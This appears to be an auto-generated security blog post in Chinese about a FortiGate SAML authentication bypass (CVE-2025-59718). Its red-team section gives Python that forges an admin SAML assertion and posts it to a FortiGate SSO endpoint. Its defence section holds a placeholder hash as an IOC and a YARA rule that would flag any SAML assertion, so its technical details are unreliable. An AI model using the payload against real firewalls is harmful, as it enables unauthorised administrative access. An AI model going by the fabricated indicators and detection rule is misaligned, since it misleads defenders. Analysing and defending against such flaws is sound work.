---
layout: post
title:  "Fortinet admins report patched FortiGate firewalls getting hacked"
date:   2026-01-21 18:35:10 +0000
categories: [security]
severity: critical
---

# 🚨 解析 FortiGate 身份驗證繞過漏洞：CVE-2025-59718
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: SAML 消息處理、身份驗證繞過、FortiCloud SSO

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: FortiGate 的身份驗證機制中，存在一個漏洞，允許攻擊者通過精心構造的 SAML 消息來繞過身份驗證。
* **攻擊流程圖解**:
  1. 攻擊者構造一個惡意的 SAML 消息，包含假的身份驗證資訊。
  2. 攻擊者將惡意的 SAML 消息發送到 FortiGate 的身份驗證端點。
  3. FortiGate 的身份驗證機制未能正確驗證 SAML 消息，導致身份驗證繞過。
* **受影響元件**: FortiGate 7.4.9 和之前的版本。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要知道 FortiGate 的 IP 地址和 FortiCloud SSO 登入功能已啟用。
* **Payload 建構邏輯**:

    ```
    
    python
    import xml.etree.ElementTree as ET
    
    # 建構惡意的 SAML 消息
    saml_message = ET.Element("saml:Assertion")
    saml_message.set("xmlns:saml", "urn:oasis:names:tc:SAML:2.0:assertion")
    
    # 添加假的身份驗證資訊
    subject = ET.SubElement(saml_message, "saml:Subject")
    name_id = ET.SubElement(subject, "saml:NameID")
    name_id.text = "attacker"
    
    # 添加假的授權資訊
    attribute_statement = ET.SubElement(saml_message, "saml:AttributeStatement")
    attribute = ET.SubElement(attribute_statement, "saml:Attribute")
    attribute.set("Name", "admin")
    attribute_value = ET.SubElement(attribute, "saml:AttributeValue")
    attribute_value.text = "true"
    
    # 將 SAML 消息轉換為 XML 字串
    saml_xml = ET.tostring(saml_message, encoding="unicode")
    
    # 發送惡意的 SAML 消息到 FortiGate
    import requests
    response = requests.post("https://fortigate-ip/saml/SSO", data={"SAMLResponse": saml_xml})
    
    ```
* **繞過技術**: 攻擊者可以使用這種方法來繞過 FortiGate 的身份驗證機制，獲得管理員權限。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 104.28.244.114 | mail.io | /saml/SSO |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule FortiGate_SSO_Bypass {
      meta:
        description = "Detects FortiGate SSO bypass attempts"
      strings:
        $saml_message = "saml:Assertion"
        $name_id = "NameID"
      condition:
        $saml_message and $name_id
    }
    
    ```
* **緩解措施**: 除了更新 FortiGate 的軟件版本外，還可以暫時禁用 FortiCloud SSO 登入功能。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **SAML (Security Assertion Markup Language)**: 一種用於身份驗證和授權的 XML 標準。
* **FortiCloud SSO**: FortiGate 的雲端基礎的單點登入功能。
* **身份驗證繞過**: 一種攻擊方法，允許攻擊者繞過身份驗證機制，獲得未經授權的訪問權限。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/fortinet-admins-report-patched-fortigate-firewalls-getting-hacked/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1550/)


